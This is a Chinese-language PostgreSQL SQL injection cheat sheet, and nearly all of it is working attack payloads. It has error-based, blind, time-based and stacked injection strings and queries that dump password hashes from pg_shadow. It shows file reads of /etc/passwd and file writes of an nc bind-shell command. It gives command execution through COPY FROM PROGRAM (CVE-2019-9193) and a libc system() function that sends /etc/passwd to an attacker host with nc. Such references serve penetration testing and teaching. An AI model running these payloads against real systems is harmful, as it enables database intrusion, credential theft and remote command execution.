# PostgreSQL 注入

## 摘要

* [PostgreSQL 注释](#postgresql-comments)
* [PostgreSQL 版本](#postgresql-version)
* [PostgreSQL 当前用户](#postgresql-current-user)
* [PostgreSQL 列出用户](#postgresql-list-users)
* [PostgreSQL 列出密码哈希](#postgresql-list-password-hashes)
* [PostgreSQL 列出数据库管理员账户](#postgresql-list-database-administrator-accounts)
* [PostgreSQL 列出权限](#postgresql-list-privileges)
* [PostgreSQL 检查当前用户是否为超级用户](#postgresql-check-if-current-user-is-superuser)
* [PostgreSQL 数据库名称](#postgresql-database-name)
* [PostgreSQL 列出数据库](#postgresql-list-database)
* [PostgreSQL 列出表格](#postgresql-list-tables)
* [PostgreSQL 列出列](#postgresql-list-columns)
* [PostgreSQL 基于错误](#postgresql-error-based)
* [PostgreSQL XML 辅助工具](#postgresql-xml-helpers)
* [PostgreSQL 盲注](#postgresql-blind)
* [PostgreSQL 基于时间](#postgresql-time-based)
* [PostgreSQL 堆叠查询](#postgresql-stacked-query)
* [PostgreSQL 文件读取](#postgresql-file-read)
* [PostgreSQL 文件写入](#postgresql-file-write)
* [PostgreSQL 命令执行](#postgresql-command-execution)
  * [CVE-2019–9193](#cve-20199193)
  * [使用 libc.so.6](#using-libcso6)
* [绕过过滤器](#bypass-filter)
* [参考资料](#references)

## PostgreSQL 注释

```sql
--
/**/  
```

## PostgreSQL 注入链符号

```sql
; #用于终止 SQL 命令。它只能在语句中的字符串常量或引用标识符中使用。
|| #或语句

# 使用示例： 
/?whatever=1;(select 1 from pg_sleep(5))
/?whatever=1||(select 1 from pg_sleep(5))
```

## PostgreSQL 版本

```sql
SELECT version()
```

## PostgreSQL 当前用户	

```sql
SELECT user;
SELECT current_user;
SELECT session_user;
SELECT usename FROM pg_user;
SELECT getpgusername();
```

## PostgreSQL 列出用户

```sql
SELECT usename FROM pg_user
```

## PostgreSQL 列出密码哈希

```sql
SELECT usename, passwd FROM pg_shadow 
```

## PostgreSQL 列出数据库管理员账户

```sql
SELECT usename FROM pg_user WHERE usesuper IS TRUE
```

## PostgreSQL 列出权限

```sql
SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user
```

## PostgreSQL 检查当前用户是否为超级用户

```sql
SHOW is_superuser; 
SELECT current_setting('is_superuser');
SELECT usesuper FROM pg_user WHERE usename = CURRENT_USER;
```

## PostgreSQL 数据库名称

```sql
SELECT current_database()
```

## PostgreSQL 列出数据库

```sql
SELECT datname FROM pg_database
```

## PostgreSQL 列出表格

```sql
SELECT table_name FROM information_schema.tables
```

## PostgreSQL 列出列

```sql
SELECT column_name FROM information_schema.columns WHERE table_name='data_table'
```

## PostgreSQL 基于错误

```sql
,cAsT(chr(126)||vErSiOn()||chr(126)+aS+nUmeRiC)
,cAsT(chr(126)||(sEleCt+table_name+fRoM+information_schema.tables+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--
,cAsT(chr(126)||(sEleCt+column_name+fRoM+information_schema.columns+wHerE+table_name='data_table'+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--
,cAsT(chr(126)||(sEleCt+data_column+fRoM+data_table+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)

' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1
' and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int) and '1'='1
' and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int) and '1'='1
' and 1=cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and '1'='1
```

## PostgreSQL XML 辅助工具

```sql
select query_to_xml('select * from pg_user',true,true,''); -- 将指定查询的所有结果作为单个 XML 行返回
```

上述 `query_to_xml` 会将指定查询的所有结果作为单个结果返回。将此与 [PostgreSQL 基于错误](#postgresql-error-based) 技术结合使用，可以在不必担心将查询限制为一个结果的情况下泄露数据。

```sql
select database_to_xml(true,true,''); -- 将当前数据库转储为 XML
select database_to_xmlschema(true,true,''); -- 将当前数据库转储为 XML 模式
```

注意，对于上述查询，输出需要在内存中组装。对于较大的数据库，这可能会导致速度减慢或服务拒绝条件。

## PostgreSQL 盲注

```sql
' and substr(version(),1,10) = 'PostgreSQL' and '1  -> OK
' and substr(version(),1,10) = 'PostgreXXX' and '1  -> KO
```

## PostgreSQL 基于时间

#### 识别基于时间的

```sql
select 1 from pg_sleep(5)
;(select 1 from pg_sleep(5))
||(select 1 from pg_sleep(5))
```

#### 数据库转储基于时间

```sql
select case when substring(datname,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from pg_database limit 1
```

#### 表转储基于时间

```sql
select case when substring(table_name,1,1)='a' then pg_sleep(5) else pg_sleep(0) end from information_schema.tables limit 1
```

#### 列转储基于时间

```sql
select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name limit 1
select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name where column_name='value' limit 1
```

```sql
AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))
AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))
```

## PostgreSQL 堆叠查询

使用分号 ";" 添加另一个查询

```sql
http://host/vuln.php?id=injection';create table NotSoSecure (data varchar(200));--
```

## PostgreSQL 文件读取

```sql
select pg_ls_dir('./');
select pg_read_file('PG_VERSION', 0, 200);
```

注意：早期版本的 Postgres 在 `pg_read_file` 或 `pg_ls_dir` 中不接受绝对路径。较新版本（自 [此](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) 提交起）允许超级用户或在 `default_role_read_server_files` 组中的用户读取任何文件/文件路径。

```sql
CREATE TABLE temp(t TEXT);
COPY temp FROM '/etc/passwd';
SELECT * FROM temp limit 1 offset 0;
```

```sql
SELECT lo_import('/etc/passwd'); -- 将文件创建为大对象并返回 OID
SELECT lo_get(16420); -- 使用上述返回的 OID
SELECT * from pg_largeobject; -- 或获取所有大对象及其数据
```

## PostgreSQL 文件写入

```sql
CREATE TABLE pentestlab (t TEXT);
INSERT INTO pentestlab(t) VALUES('nc -lvvp 2346 -e /bin/bash');
SELECT * FROM pentestlab;
COPY pentestlab(t) TO '/tmp/pentestlab';
```

或一行：

```sql
COPY (SELECT 'nc -lvvp 2346 -e /bin/bash') TO '/tmp/pentestlab';
```

```sql
SELECT lo_from_bytea(43210, 'your file data goes in here'); -- 使用 OID 43210 和一些数据创建一个大对象
SELECT lo_put(43210, 20, 'some other data'); -- 在偏移量 20 处向大对象追加数据
SELECT lo_export(43210, '/tmp/testexport'); -- 将数据导出到 /tmp/testexport
```

## PostgreSQL 命令执行

### CVE-2019–9193

如果可以直接访问数据库，则可以从 [Metasploit](https://github.com/rapid7/metasploit-framework/pull/11598) 使用，否则需要手动执行以下 SQL 查询。 

```SQL
DROP TABLE IF EXISTS cmd_exec;          -- [可选] 如果表已存在，删除要使用的表
CREATE TABLE cmd_exec(cmd_output text); -- 创建要保存命令输出的表
COPY cmd_exec FROM PROGRAM 'id';        -- 通过 COPY FROM PROGRAM 函数运行系统命令
SELECT * FROM cmd_exec;                 -- [可选] 查看结果
DROP TABLE IF EXISTS cmd_exec;          -- [可选] 移除表
```

![https://cdn-images-1.medium.com/max/1000/1*xy5graLstJ0KysUCmPMLrw.png](https://cdn-images-1.medium.com/max/1000/1*xy5graLstJ0KysUCmPMLrw.png)

### 使用 libc.so.6

```sql
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');
```

### 绕过过滤器

#### 引号

使用 CHR

```sql
SELECT CHR(65)||CHR(66)||CHR(67);
```

使用美元符号 ( >= PostgreSQL 8 版本)

```sql
SELECT $$This is a string$$
SELECT $TAG$This is another string$TAG$
```

## 参考资料

* [PostgreSQL 渗透测试指南 - David Hayter](https://medium.com/@cryptocracker99/a-penetration-testers-guide-to-postgresql-d78954921ee9)
* [PostgreSQL 9.3 及以上版本的身份验证任意命令执行 - 2019年3月20日 - GreenWolf](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5)
* [SQL 注入 /webApp/oma_conf ctx 参数 (viestinta.lahitapiola.fi) - 2016年12月8日 - Sergey Bobrov (bobrov)](https://hackerone.com/reports/181803)
* [POSTGRESQL 9.X 远程命令执行 - 2017年10月26日 - Daniel](https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/)
* [SQL 注入和 Postgres - 通往最终 RCE 的冒险之旅 - 2020年5月5日 - Denis Andzakovic](https://pulsesecurity.co.nz/articles/postgres-sqli)
* [高级 PostgreSQL SQL 注入和过滤器绕过技术 - 2009 - INFIGO](https://www.infigo.hr/files/INFIGO-TD-2009-04_PostgreSQL_injection_ENG.pdf)
